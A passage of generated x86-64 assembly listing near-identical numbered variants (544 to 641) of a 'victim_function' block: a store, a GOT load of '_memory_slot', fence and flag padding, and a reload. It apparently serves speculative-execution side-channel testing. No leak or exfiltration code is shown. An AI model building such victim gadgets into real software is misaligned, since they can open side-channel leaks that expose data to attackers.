	jmp	.Lvictim_function_win0_continue
## Variant 544
.Lvictim_function_win0_var544:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 545
.Lvictim_function_win0_var545:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 546
.Lvictim_function_win0_var546:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 547
.Lvictim_function_win0_var547:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 548
.Lvictim_function_win0_var548:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 549
.Lvictim_function_win0_var549:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 550
.Lvictim_function_win0_var550:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 551
.Lvictim_function_win0_var551:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 552
.Lvictim_function_win0_var552:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 553
.Lvictim_function_win0_var553:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 554
.Lvictim_function_win0_var554:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 555
.Lvictim_function_win0_var555:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 556
.Lvictim_function_win0_var556:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 557
.Lvictim_function_win0_var557:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 558
.Lvictim_function_win0_var558:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 559
.Lvictim_function_win0_var559:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 560
.Lvictim_function_win0_var560:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 561
.Lvictim_function_win0_var561:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 562
.Lvictim_function_win0_var562:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 563
.Lvictim_function_win0_var563:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 564
.Lvictim_function_win0_var564:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 565
.Lvictim_function_win0_var565:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 566
.Lvictim_function_win0_var566:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 567
.Lvictim_function_win0_var567:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 568
.Lvictim_function_win0_var568:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 569
.Lvictim_function_win0_var569:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 570
.Lvictim_function_win0_var570:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 571
.Lvictim_function_win0_var571:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	nop
	mfence
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 572
.Lvictim_function_win0_var572:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 573
.Lvictim_function_win0_var573:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 574
.Lvictim_function_win0_var574:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 575
.Lvictim_function_win0_var575:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 576
.Lvictim_function_win0_var576:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 577
.Lvictim_function_win0_var577:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 578
.Lvictim_function_win0_var578:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 579
.Lvictim_function_win0_var579:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 580
.Lvictim_function_win0_var580:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 581
.Lvictim_function_win0_var581:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 582
.Lvictim_function_win0_var582:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 583
.Lvictim_function_win0_var583:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 584
.Lvictim_function_win0_var584:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 585
.Lvictim_function_win0_var585:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 586
.Lvictim_function_win0_var586:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 587
.Lvictim_function_win0_var587:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 588
.Lvictim_function_win0_var588:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 589
.Lvictim_function_win0_var589:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 590
.Lvictim_function_win0_var590:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 591
.Lvictim_function_win0_var591:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 592
.Lvictim_function_win0_var592:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 593
.Lvictim_function_win0_var593:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 594
.Lvictim_function_win0_var594:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 595
.Lvictim_function_win0_var595:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 596
.Lvictim_function_win0_var596:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 597
.Lvictim_function_win0_var597:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 598
.Lvictim_function_win0_var598:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 599
.Lvictim_function_win0_var599:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 600
.Lvictim_function_win0_var600:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 601
.Lvictim_function_win0_var601:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 602
.Lvictim_function_win0_var602:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 603
.Lvictim_function_win0_var603:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 604
.Lvictim_function_win0_var604:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 605
.Lvictim_function_win0_var605:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 606
.Lvictim_function_win0_var606:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 607
.Lvictim_function_win0_var607:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 608
.Lvictim_function_win0_var608:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 609
.Lvictim_function_win0_var609:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 610
.Lvictim_function_win0_var610:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 611
.Lvictim_function_win0_var611:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 612
.Lvictim_function_win0_var612:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 613
.Lvictim_function_win0_var613:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 614
.Lvictim_function_win0_var614:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 615
.Lvictim_function_win0_var615:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 616
.Lvictim_function_win0_var616:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 617
.Lvictim_function_win0_var617:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 618
.Lvictim_function_win0_var618:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 619
.Lvictim_function_win0_var619:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 620
.Lvictim_function_win0_var620:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 621
.Lvictim_function_win0_var621:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 622
.Lvictim_function_win0_var622:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 623
.Lvictim_function_win0_var623:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 624
.Lvictim_function_win0_var624:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 625
.Lvictim_function_win0_var625:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 626
.Lvictim_function_win0_var626:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 627
.Lvictim_function_win0_var627:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 628
.Lvictim_function_win0_var628:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 629
.Lvictim_function_win0_var629:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 630
.Lvictim_function_win0_var630:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 631
.Lvictim_function_win0_var631:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 632
.Lvictim_function_win0_var632:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 633
.Lvictim_function_win0_var633:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 634
.Lvictim_function_win0_var634:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 635
.Lvictim_function_win0_var635:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 636
.Lvictim_function_win0_var636:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 637
.Lvictim_function_win0_var637:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 638
.Lvictim_function_win0_var638:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 639
.Lvictim_function_win0_var639:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 640
.Lvictim_function_win0_var640:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 641
.Lvictim_function_win0_var641:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 642
